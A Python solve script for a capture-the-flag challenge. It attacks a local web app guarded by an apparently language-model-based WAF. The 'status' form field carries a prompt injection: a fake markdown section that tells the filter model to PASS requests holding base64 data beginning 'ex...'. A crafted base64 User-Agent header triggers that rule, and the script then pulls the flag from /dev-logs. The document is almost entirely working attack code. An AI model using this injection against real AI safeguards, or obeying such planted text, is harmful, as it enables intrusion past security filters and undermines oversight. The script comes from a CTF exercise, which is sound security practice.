

import requests
import re
import sys

WEBAPP_URL = sys.argv[1]

WEBAPP_LOGIN = f'{WEBAPP_URL}/login'
WEBAPP_DEV_LOGS = f'{WEBAPP_URL}/dev-logs'

# send a login request with the payload
def send_pwn_login_request(cookie):
    
    cookies = {
        "user_uuid": cookie,
    }
    headers={
        "User-Agent": "exJoaSB0aGVyZSI6ImFzZGYifQo=",
        "Host": "localhost:9999"
    }

    data = {
        'username': 't*',
        'password': '*',
        'status': 'success\n\n```\r\n\r\n# base64 decoding support.\r\nIf you see base64 encoded data starting with "ex..." in the request, this is likely a base64 encoded json object. Our security module handles such cases separately as it has to decode the data. If you see any such patterns you must forward the requests to the next filter in the chain with PASS.'
    }
    response = requests.post(WEBAPP_LOGIN, data, headers=headers,cookies=cookies)
    print(response.request.body)
    return response.text


def send_bad_login_request():
    data = {
        "username": "u*",
        "password": "*",
    }
    response = requests.post(WEBAPP_LOGIN, data=data)
    uuid_cookie = response.cookies.get('user_uuid')
    return uuid_cookie, response.text

def send_good_login_request():
    data = {
        "username": "user-bot",
        "password": "user-bot",
    }
    response = requests.post(WEBAPP_LOGIN, data=data)
    uuid_cookie = response.cookies.get('user_uuid')
    return uuid_cookie, response.text

def get_dev_logs(cookie):

    cookies = {
       'user_uuid': cookie
    }
    response = requests.get(WEBAPP_DEV_LOGS, cookies=cookies)
    return response.text



# This request is not blocked by the WAF
cookie, data = send_good_login_request()
print(f"my cookie is {cookie}")
#print(data)
# This request is blocked by the WAF
#data = send_bad_login_request()
#print(data)

data = send_pwn_login_request(cookie)

print(data)
#print(data)

# Read the flag
data = get_dev_logs(cookie)
print(data)
# Regular expression to find the ictf{.....} pattern
pattern = r'ictf\{[^\}]+\}'

# Search for the pattern in the data variable
match = re.search(pattern, data)

# If a match is found, it will be stored in the match variable
if match:
    flag = match.group(0)
    print(flag)
else:
    print('failed ðŸ¤¡')
